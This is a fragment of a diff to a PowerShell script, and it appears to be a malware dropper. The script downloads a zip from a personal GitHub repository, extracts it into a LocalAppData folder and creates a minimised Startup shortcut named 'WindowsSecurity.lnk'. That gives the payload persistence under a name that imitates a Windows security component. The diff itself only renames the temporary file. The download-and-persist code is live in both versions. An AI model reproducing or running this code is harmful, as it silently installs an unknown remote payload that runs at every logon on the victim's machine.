@@ -23,8 +23,8 @@ $dst = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('LocalAppli
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 if (Test-Path $dst) { Remove-Item -Recurse -Force "$dst\*" } else { New-Item -ItemType Directory -Force $dst }
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/mhung420vnv/abc/raw/refs/heads/main/ok.zip', [System.IO.Path]::GetTempPath() + 'xFSOj9El1Q.zip')
-[System.IO.Compression.ZipFile]::ExtractToDirectory([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'xFSOj9El1Q.zip'), $dst)
+(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/mhung420vnv/abc/raw/refs/heads/main/ok.zip', [System.IO.Path]::GetTempPath() + 'ok.zip')
+[System.IO.Compression.ZipFile]::ExtractToDirectory([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'ok.zip'), $dst)
 $obj = New-Object -ComObject WScript.Shell
 $link = $obj.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.lnk")
 $link.WindowStyle = 7
